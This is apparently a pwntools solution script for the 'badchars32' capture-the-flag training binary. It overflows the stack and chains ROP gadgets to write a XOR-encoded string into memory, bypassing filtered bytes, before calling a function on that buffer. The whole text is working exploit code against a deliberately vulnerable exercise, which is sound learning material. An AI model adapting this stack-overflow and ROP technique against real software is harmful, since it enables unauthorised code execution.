from pwn import *

target = process("./badchars32")
elf = ELF("badchars32")

pop = 0x080485b9 #: pop esi ; pop edi ; pop ebp ; ret
mov = 0x0804854f #: mov dword ptr [edi], esi ; ret
popebx = 0x0804839d #: pop ebx; ret;
popebp = 0x080485bb #: pop ebp; ret; 
_xor_gdg = 0x08048547 #: xor byte ptr [ebp], bl; ret; 


def write(loc, data):
	return p32(pop) + p32(data) + p32(loc) + p32(0x88) + p32(mov)

def _xor(loc, n):
	return p32(popebx) + p32(n) + p32(popebp) + p32(loc) + p32(_xor_gdg)

flag_loc1 = 0x804a0b0
flag_loc2 = 0x804a0b4
esi2 = 0x747c742a
esi1 = 0x63656c66

import time
time.sleep(5)

payload =  "b" * 0x2c + write(flag_loc1, esi1) + write(flag_loc2, esi2) + _xor(flag_loc1 + 3, 4) + _xor(flag_loc1 + 6, 4) + _xor(flag_loc1 + 2, 4) + _xor(flag_loc1 + 4, 4)
payload += p32(0x80483d0) + p32(flag_loc1)*2
target.sendline(payload)
target.interactive()
